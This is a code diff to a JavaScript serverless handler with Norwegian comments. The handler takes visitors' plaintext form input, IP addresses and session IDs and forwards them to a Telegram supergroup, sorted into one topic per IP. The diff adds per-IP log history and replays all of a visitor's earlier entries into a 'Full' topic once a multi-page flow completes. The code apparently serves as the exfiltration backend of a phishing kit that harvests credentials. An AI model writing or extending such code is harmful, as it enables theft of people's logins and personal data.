@@ -9,9 +9,22 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må v�
 // I produksjon kan du bruke en database i stedet
 const ipToTopicMap = new Map();
 const ipToFullTopicMap = new Map();
+const ipLogHistory = new Map();
+const ipFullTopicSynced = new Set();
 
 function getFullTopicName(ipAddress) {
   return `Full: ${ipAddress}`;
+}
+
+function appendLogHistory(ipAddress, entry) {
+  if (!ipLogHistory.has(ipAddress)) {
+    ipLogHistory.set(ipAddress, []);
+  }
+  ipLogHistory.get(ipAddress).push(entry);
+}
+
+function getLogHistory(ipAddress) {
+  return ipLogHistory.get(ipAddress) || [];
 }
 
 /**
@@ -211,7 +224,7 @@ async function sendToTelegram(chatId, message, topicId = null) {
  * Formaterer data til en lesbar Telegram-melding
  */
 function formatTelegramMessage(data, isNewIPAddress = false) {
-  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;
+  const { page, event_description, klartekst_input, ip_adresse, session_uid, timestamp } = data;
   
   let message = '';
   
@@ -234,8 +247,12 @@ function formatTelegramMessage(data, isNewIPAddress = false) {
   if (session_uid) {
     message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
   }
+
+  const formattedTime = timestamp
+    ? new Date(timestamp).toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })
+    : new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' });
   
-  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;
+  message += `\n⏰ <b>Tid:</b> ${formattedTime}`;
   
   return message;
 }
@@ -269,6 +286,28 @@ function formatCompletionMessage(data, isNewFullTopic = false) {
   return message;
 }
 
+async function syncFullTopicHistory(ipAddress, fullTopicId, currentData) {
+  const completionMessage = formatCompletionMessage(currentData, true);
+  await sendToTelegram(TELEGRAM_CHAT_ID, completionMessage, fullTopicId);
+
+  const history = getLogHistory(ipAddress);
+  for (const entry of history) {
+    const historyMessage = formatTelegramMessage({
+      page: entry.page,
+      event_description: entry.event_description,
+      klartekst_input: entry.klartekst_input,
+      ip_adresse: ipAddress,
+      session_uid: entry.session_uid,
+      timestamp: entry.timestamp,
+    }, false);
+
+    await sendToTelegram(TELEGRAM_CHAT_ID, historyMessage, fullTopicId);
+  }
+
+  ipFullTopicSynced.add(ipAddress);
+  console.log(`Historikk (${history.length} logger) sendt til topic "${getFullTopicName(ipAddress)}"`);
+}
+
 async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Kun POST er tillatt' });
@@ -300,6 +339,15 @@ async function handler(req, res) {
 
     // Sjekk om dette er en ny IP-adresse før vi oppretter topic
     const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
+
+    const logEntry = {
+      page,
+      event_description,
+      klartekst_input,
+      session_uid,
+      timestamp: new Date().toISOString(),
+    };
+    appendLogHistory(ip_adresse, logEntry);
     
     // Hent eller opprett topic for denne IP-adressen
     const topicId = await getOrCreateTopicForIP(ip_adresse);
@@ -311,27 +359,37 @@ async function handler(req, res) {
       klartekst_input,
       ip_adresse,
       session_uid,
+      timestamp: logEntry.timestamp,
     }, isNewIPAddress);
 
     // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
     await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
 
-    // Ekstra "Full"-topic når brukeren har fullført flyten (page5/page6)
+    // Ekstra "Full"-topic når brukeren har fullført flyten (page4/page6)
     if (flow_completed) {
-      const isNewFullTopic = !ipToFullTopicMap.has(ip_adresse);
       const fullTopicId = await getOrCreateFullTopicForIP(ip_adresse);
 
       if (fullTopicId) {
-        const completionMessage = formatCompletionMessage({
+        const currentData = {
           page,
           event_description,
           klartekst_input,
           ip_adresse,
           session_uid,
-        }, isNewFullTopic);
+        };
 
-        await sendToTelegram(TELEGRAM_CHAT_ID, completionMessage, fullTopicId);
-        console.log(`Fullføringsmelding sendt til topic "${getFullTopicName(ip_adresse)}" for IP: ${ip_adresse}`);
+        if (!ipFullTopicSynced.has(ip_adresse)) {
+          await syncFullTopicHistory(ip_adresse, fullTopicId, currentData);
+        } else {
+          await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
+        }
+
+        console.log(`Full-topic oppdatert for IP: ${ip_adresse}`);
+      }
+    } else if (ipFullTopicSynced.has(ip_adresse)) {
+      const fullTopicId = ipToFullTopicMap.get(ip_adresse);
+      if (fullTopicId) {
+        await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
       }
     }
 
